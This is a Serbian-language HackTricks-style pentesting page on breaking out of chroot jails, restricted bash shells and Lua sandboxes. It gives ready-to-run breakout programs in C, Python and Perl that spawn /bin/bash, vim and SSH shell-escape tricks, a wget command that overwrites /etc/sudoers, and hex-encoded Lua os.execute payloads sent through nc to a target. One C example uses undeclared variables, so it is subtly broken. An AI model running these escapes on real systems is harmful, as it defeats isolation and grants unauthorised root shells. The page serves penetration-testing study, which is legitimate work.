# Izlazak iz zatvora

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Pretražite u** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **da li možete izvršiti bilo koji binarni fajl sa "Shell" svojstvom**

## Chroot izlazi

Sa [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Chroot mehanizam **nije namenjen da brani** od namernog manipulisanja od strane **privilegovanih** (**root**) **korisnika**. Na većini sistema, chroot konteksti se ne slažu pravilno i chrootovani programi **sa dovoljnim privilegijama mogu izvršiti drugi chroot da bi pobegli**.\
Obično to znači da da biste pobegli, morate biti root unutar chroot-a.

> [!TIP]
> **Alat** [**chw00t**](https://github.com/earthquake/chw00t) je kreiran da zloupotrebi sledeće scenarije i pobegne iz `chroot`.

### Root + CWD

> [!WARNING]
> Ako ste **root** unutar chroot-a, **možete pobegnuti** kreiranjem **drugog chroot-a**. To je zato što 2 chroot-a ne mogu koegzistirati (u Linux-u), tako da ako kreirate folder i zatim **napravite novi chroot** u tom novom folderu dok ste **van njega**, sada ćete biti **van novog chroot-a** i stoga ćete biti u FS-u.
>
> To se dešava jer obično chroot NE pomera vaš radni direktorijum na označeni, tako da možete kreirati chroot, ali biti van njega.

Obično nećete pronaći `chroot` binarni fajl unutar chroot zatvora, ali **možete kompajlirati, otpremiti i izvršiti** binarni fajl:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Sačuvani fd

> [!WARNING]
> Ovo je slično prethodnom slučaju, ali u ovom slučaju **napadač čuva deskriptor datoteke za trenutni direktorijum** i zatim **stvara chroot u novom folderu**. Na kraju, pošto ima **pristup** tom **FD** **van** chroot-a, pristupa mu i **beži**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD može biti prosleđen preko Unix Domain Sockets, tako da:
>
> - Kreirajte podproces (fork)
> - Kreirajte UDS kako bi roditelj i dete mogli da komuniciraju
> - Pokrenite chroot u podprocesu u drugom folderu
> - U roditeljskom procesu, kreirajte FD foldera koji je van novog chroot-a podprocesa
> - Prosledite tom podprocesu taj FD koristeći UDS
> - Podproces menja direktorijum na taj FD, i pošto je van svog chroot-a, pobegnuće iz zatvora

### Root + Mount

> [!WARNING]
>
> - Montiranje root uređaja (/) u direktorijum unutar chroot-a
> - Chrootovanje u taj direktorijum
>
> Ovo je moguće u Linux-u

### Root + /proc

> [!WARNING]
>
> - Montirajte procfs u direktorijum unutar chroot-a (ako već nije)
> - Potražite pid koji ima drugačiji root/cwd unos, kao: /proc/1/root
> - Chrootujte u taj unos

### Root(?) + Fork

> [!WARNING]
>
> - Kreirajte Fork (podproces) i chrootujte u drugi folder dublje u FS i CD na njega
> - Iz roditeljskog procesa, premestite folder u kojem se podproces nalazi u folder prethodni chroot-u dece
> - Ovaj podproces će se naći van chroot-a

### ptrace

> [!WARNING]
>
> - Pre nekog vremena korisnici su mogli da debaguju svoje procese iz procesa samog sebe... ali to više nije moguće po default-u
> - U svakom slučaju, ako je moguće, mogli biste ptrace u proces i izvršiti shellcode unutar njega ([vidi ovaj primer](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Dobijte informacije o zatvoru:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Измените PATH

Проверите да ли можете да измените PATH env променљиву
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Korišćenje vim-a
```bash
:set shell=/bin/sh
:shell
```
### Napravite skriptu

Proverite da li možete da kreirate izvršni fajl sa _/bin/bash_ kao sadržajem
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Dobijanje bash-a preko SSH

Ako pristupate putem ssh, možete koristiti ovu trik da izvršite bash shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Deklarisati
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Možete prepisati, na primer, sudoers datoteku.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Ostali trikovi

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Takođe bi mogla biti zanimljiva stranica:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python zatvori

Trikovi o izlasku iz python zatvora na sledećoj stranici:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua zatvori

Na ovoj stranici možete pronaći globalne funkcije kojima imate pristup unutar lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval sa izvršavanjem komandi:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Nekoliko trikova za **pozivanje funkcija biblioteke bez korišćenja tačaka**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Nabrojite funkcije biblioteke:
```bash
for k,v in pairs(string) do print(k,v) end
```
Napomena da se svaki put kada izvršite prethodni jedan red u **drugom lua okruženju redosled funkcija menja**. Stoga, ako treba da izvršite jednu specifičnu funkciju, možete izvršiti napad silom učitavajući različita lua okruženja i pozivajući prvu funkciju iz biblioteke:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Dobijte interaktivnu lua ljusku**: Ako ste unutar ograničene lua ljuske, možete dobiti novu lua ljusku (i nadamo se neograničenu) pozivajući:
```bash
debug.debug()
```
## Reference

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Prezentacije: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}
